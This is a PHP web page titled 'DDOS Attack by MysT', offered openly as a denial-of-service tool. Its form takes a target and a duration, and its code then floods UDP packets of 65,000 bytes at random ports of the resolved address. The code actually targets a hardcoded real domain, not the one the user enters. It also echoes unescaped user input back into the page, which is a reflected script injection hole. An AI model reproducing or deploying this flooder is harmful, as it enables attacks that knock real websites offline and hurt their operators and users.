<HTML>

<title>DDOS by MysT</title>

<body>
<style>
	body {
		background-color: black;
		color: white;
		text-align: center;
	}
	button {
    text-align: center;
    display: inline-block;
    font-size: 20px;
    border-radius: 4px;
}
</style>
<h1>DDOS Attack by MysT</h1>


<?php

function getAddresses($domain) {
  $records = dns_get_record($domain);
  $res = array();
  foreach ($records as $r) {
    if ($r['host'] != $domain) continue; // glue entry
    if (!isset($r['type'])) continue; // DNSSec

    if ($r['type'] == 'A') $res[] = $r['ip'];
    if ($r['type'] == 'AAAA') $res[] = $r['ipv6'];
  }
  return $res;
}

function getAddresses_www($domain) {
  $res = getAddresses($domain);
  if (count($res) == 0) {
    $res = getAddresses('www.' . $domain);
  }
  return $res;
}


if (isset($_GET['host']) && isset($_GET['time']) && $_GET['host'] != "" && $_GET['time'] != "" ) {
	ignore_user_abort(TRUE);
	set_time_limit(0);

	$host = $_GET['host'];
	$time = $_GET['time'];

	$packets = 0;

	$ip = getAddresses_www('lappusa.com');

	$current_time = time();
	$timelimit = $current_time + $time;

	for ($i = 0; $i < 65000; $i++) {
		$out .= 'X';
	}
	while(1) {
		$packets++;
		if (time() > $timelimit) {		
			break;
		}
		$rand = rand(1,65000);
		$fp = fsockopen("udp://".$ip[0], $rand, $errno, $errstr, 5);
		socket_set_timeout($fp, 2);
		fwrite($fp, $out);
    	$status = socket_get_status($fp);
		fclose($fp);
	}
	echo $errstr;    
	echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$time, 2) . " packets per second \n";
    echo '<br><br>';

    echo "<form method='GET'>
		<input type='text' name='host' placeholder='Wesite URL' value=".$_GET['host']."> </input>
		</br>
		</br>
		<input type='text' name='time' placeholder='Length in seconds' value=".$_GET['time']."> </input>
		</br>
		</br>
		<button>Submit</button>
	</form>";

} else {
	echo"<form method='GET'>
		<input type='text' name='host' placeholder='Wesite URL'> </input>
		</br>
		</br>
		<input type='text' name='time' placeholder='Length in seconds'> </input>
		</br>
		</br>
		<button>Submit</button>
	</form>	";
}

?>


</body>

</HTML>



